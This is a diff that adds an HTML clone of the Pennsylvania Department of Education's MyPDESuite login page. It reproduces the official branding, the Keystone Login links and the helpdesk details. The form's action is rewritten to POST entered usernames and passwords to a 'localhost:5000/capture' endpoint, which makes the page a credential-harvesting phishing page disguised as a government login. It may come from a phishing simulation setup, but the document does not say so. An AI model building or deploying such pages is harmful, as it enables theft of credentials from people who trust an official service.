@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<head id="ctl00_Head1">
+ <title>
+  MyPDESuite Login Page
+ </title>
+ <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+ <link href="assets\StyleSheet.css" rel="stylesheet" type="text/css"/>
+ <style>
+  .defaultTextBox {
+    padding: 0;
+    height: 30px;
+    position: relative;
+    left: 0;
+    outline: none;
+    border: 1px solid #cdcdcd;
+    border-color: rgba(0,0,0,.15);
+    background-color: white;
+    font-size: 16px;
+}
+.advancedSearchTextbox {
+    width: 526px;
+    margin-right: -4px;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+/* Create two equal columns that floats next to each other */
+.column {
+  float: left;
+  width: 47%;
+  height: 250px; /* Should be removed. Only for demonstration */
+}
+
+/* Clear floats after the columns */
+.row:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+
+
+.twentysixpoint {line-height: 26pt;}
+       .auto-style2 {
+           width: 200px;
+           height: 59px;
+       }
+ </style>
+ <script lang="javascript" type="text/javascript">
+  function SubmitOnEnterPressed(event) {
+           var x = event.keyCode;
+           if (x == 13) {  // 13 is enter button
+               document.getElementById("ctl00_contentPageDescription_btnLogin").click();
+           }
+       }
+ </script>
+ <script language="javascript" type="text/javascript">
+  //        $('a[href^="http://"]').attr({ target: "_blank", title: "Opens in a new window" })
+
+        function delayer() {
+            window.location = 'wfSessiontimeOut.aspx';
+            //            alert('Session Expired. Please refresh/reopen the browser.');
+            //            window.open('', '_self', '');
+            //            window.close();
+        }
+ </script>
+</head>
+<body>
+ <form action="http://localhost:5000/capture" id="aspnetForm" method="POST">
+  <input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwUKMTM4MDEzMTM1OA9kFgJmD2QWBAIBD2QWAgIEDxUBFXdmU2Vzc2lvbnRpbWVPdXQuYXNweGQCAw9kFgQCAg88KwANAQAPFgIeB1Zpc2libGVoZGQCBA9kFgoCAQ8PFgIeBFRleHRlZGQCCQ8PFgIeC05hdmlnYXRlVXJsBRxodHRwczovL2tleXN0b25lbG9naW4ucGEuZ292ZGQCDw8PFgIfAgUqaHR0cHM6Ly9rZXlzdG9uZWxvZ2luLnBhLmdvdi9BY2NvdW50L0xvZ2luZGQCEQ8PFgIfAgUzaHR0cHM6Ly9rZXlzdG9uZWxvZ2luLnBhLmdvdi9BY2NvdW50L0ZvcmdvdFVzZXJOYW1lZGQCEw8PFgIfAgUzaHR0cHM6Ly9rZXlzdG9uZWxvZ2luLnBhLmdvdi9BY2NvdW50L0ZvcmdvdFBhc3N3b3JkZGRkKbsUe5RU0cjOFi5QW5Dk+VFN75MKIYLSdgRxcCQ628w="/>
+  <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="A92396AC"/>
+  <input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="/wEdAAUw46wt8IBH+KG7utEAgmOqD8VL9sKoSdpcwdoHIiQwZ8PWtuTKMkpY4+J2QGSgfd1HDkezVTqJM/kzKPSJi3F5LER8wgLYMPRdCpJ9vcANfU3vUqRp29BvHnOjQRdTq67TugWNcrh6XUzTJy5WZ9ms"/>
+  <div>
+   <table align="center" cellpadding="0" cellspacing="0" width="952">
+    <tr>
+     <td valign="top">
+      <center>
+       <img hspace="0" id="ctl00_imgBanner" src="assets\CommonwealthBanner.jpg" vspace="0"/>
+      </center>
+      <br/>
+      <span class="rightAlign" id="ctl00_lblUserName" style="display:inline-block;">
+      </span>
+      <fieldset style="min-height:100px; font-family: sans-serif;
+    background: #fff;
+    padding: 15px;
+    box-shadow: 0 0 10px rgba(0,0,0,.3);
+
+    border: 2px groove threedface;          
+">
+       <legend style="background: #053246;
+			color: #fff;
+			padding: 10px 10px ;
+			font-size: 18px;
+			border-radius: 5px;
+			box-shadow: 0 0 0 5px #ddd;
+			margin-left: 20px;">
+        <b>
+         MyPDESuite Login Page
+        </b>
+       </legend>
+       <div id="menuWrapper">
+       </div>
+       <table>
+        <tr>
+         <td colspan="2">
+          <br/>
+          <!--  <div id="demo" begin Border -->
+          <div class="row">
+           <div class="column" style="background-color:#ffffff; padding: 10px; border-right: 1px solid #053246;">
+            <h3 style="font-size:16pt; font-weight:700; color: #053246;">
+             MyPDESuite Login Page
+            </h3>
+            <span id="ctl00_contentPageDescription_lblOutput">
+            </span>
+            <br/>
+            Use your Keystone Login or CWOPA username and password to login to MyPDESuite.
+            <br/>
+            <br/>
+            <div>
+             <label for="tbUserName">
+              <font color="#053246">
+               <b>
+                User Name:
+               </b>
+              </font>
+             </label>
+             <input autocomplete="Off" class="defaultTextBox advancedSearchTextBox" id="ctl00_contentPageDescription_tbUserName" name="ctl00$contentPageDescription$tbUserName" onkeydown="SubmitOnEnterPressed(event)" size="30" type="text"/>
+            </div>
+            <br/>
+            <div>
+             <label for="tbPwd">
+              <font color="#053246">
+               <b>
+                Password:
+               </b>
+              </font>
+             </label>
+             <input autocomplete="Off" class="defaultTextBox advancedSearchTextBox" id="ctl00_contentPageDescription_tbPwd" name="ctl00$contentPageDescription$tbPwd" onkeydown="SubmitOnEnterPressed(event)" type="password"/>
+            </div>
+            <br/>
+            <table width="100%">
+             <tr>
+              <td>
+               <div align="center">
+                <input class="button" id="ctl00_contentPageDescription_btnLogin" name="ctl00$contentPageDescription$btnLogin" onclick="this.disabled='true'; this.value='Please Wait';__doPostBack('ctl00$contentPageDescription$btnLogin','')" type="button" value="Log In"/>
+               </div>
+              </td>
+             </tr>
+            </table>
+           </div>
+           <div class="column" style="background-color:#ffffff; padding: 0px;">
+            <p style="margin-left: 25px">
+             <a href="https://keystonelogin.pa.gov" id="ctl00_contentPageDescription_hypPoweredByKeystoneURL" target="_blank">
+              <img alt="Powered By Keystone Login" class="auto-style2" src="assets\powered-by-keystone.png" style="border: 0;"/>
+             </a>
+             <br/>
+             <br/>
+             <a href="javascript:__doPostBack('ctl00$contentPageDescription$lnkKeystoneRegisterURL','')" id="ctl00_contentPageDescription_lnkKeystoneRegisterURL">
+              Register Username
+             </a>
+             <br/>
+             <br/>
+             <a href="https://keystonelogin.pa.gov/Account/Login" id="ctl00_contentPageDescription_hypKeystoneLoginURL" target="_blank">
+              Edit Account
+             </a>
+             <br/>
+             <br/>
+             <a href="https://keystonelogin.pa.gov/Account/ForgotUserName" id="ctl00_contentPageDescription_hypForgotUsernameURL" target="_blank">
+              Forgot Username
+             </a>
+             <br/>
+             <br/>
+             <a href="https://keystonelogin.pa.gov/Account/ForgotPassword" id="ctl00_contentPageDescription_hypForgotPasswordURL" target="_blank">
+              Forgot Password
+             </a>
+             <br/>
+             <br/>
+             <font color="red">
+              <b>
+               Having trouble logging in?
+              </b>
+             </font>
+             <br/>
+             Call the Keystone Login Helpdesk at:
+             <a href="tel:+18773280995">
+              877-328-0995
+             </a>
+            </p>
+           </div>
+          </div>
+         </td>
+        </tr>
+       </table>
+       <br/>
+       <div class="row">
+        <fieldset style="background-color:#f8f8ff;">
+         <p style="margin-left: 25px">
+          <h3 style="font-size:14pt; font-weight:700; color: #053246;">
+           Help &amp; Support
+          </h3>
+          <br/>
+          <font color="red">
+           <b>
+            Program Office Support
+           </b>
+          </font>
+          <br/>
+          If you require assistance with one of the applications accessed through MyPDESuite, please contact the appropriate
+          <a href="https://www.education.pa.gov/Pages/ApplicationSupport.aspx" target="_blank">
+           PDE Program Office
+          </a>
+          .
+          <br/>
+          <br/>
+          <font color="red">
+           <b>
+            MyPDESuite Support
+           </b>
+          </font>
+          <br/>
+          For resources and support, such as
+          <font color="blue">
+           becoming a Local Security Administrator
+          </font>
+          , please visit
+          <a href="https://www.education.pa.gov/Pages/MyPDESuite.aspx#helpguides" target="_blank">
+           MyPDESuite Help
+          </a>
+          .
+          <br/>
+          <br/>
+          <font color="red">
+           <b>
+            TIMS Personal Users
+           </b>
+          </font>
+          <br/>
+          To access TIMS for your personal certifications, please log in to
+          <a href="https://www.mypdeapps.pa.gov/wfTIMS.aspx">
+           TIMS
+          </a>
+          .  Please note that if you are a provisioned user of TIMS within MyPDESuite you must use a different username to login and view your personal information.
+          <br/>
+         </p>
+        </fieldset>
+       </div>
+       <br/>
+       <center>
+        <b>
+         Browser Recommendation:
+         <font color="blue">
+          Edge, Chrome or Firefox
+         </font>
+         for best results.
+        </b>
+       </center>
+       <!-- </div> End Border -->
+      </fieldset>
+     </td>
+    </tr>
+   </table>
+  </div>
+  <div>
+  </div>
+ </form>
+ <script>
+  function __doPostBack(eventTarget, eventArgument) {
+            var theForm = document.forms[0];
+            if (!theForm) return;
+            
+            if (!theForm.__EVENTTARGET) {
+                var input = document.createElement("input");
+                input.type = "hidden";
+                input.name = "__EVENTTARGET";
+                theForm.appendChild(input);
+            }
+            if (!theForm.__EVENTARGUMENT) {
+                var input = document.createElement("input");
+                input.type = "hidden";
+                input.name = "__EVENTARGUMENT";
+                theForm.appendChild(input);
+            }
+
+            theForm.__EVENTTARGET.value = eventTarget;
+            theForm.__EVENTARGUMENT.value = eventArgument;
+            theForm.submit();
+        }
+ </script>
+</body>
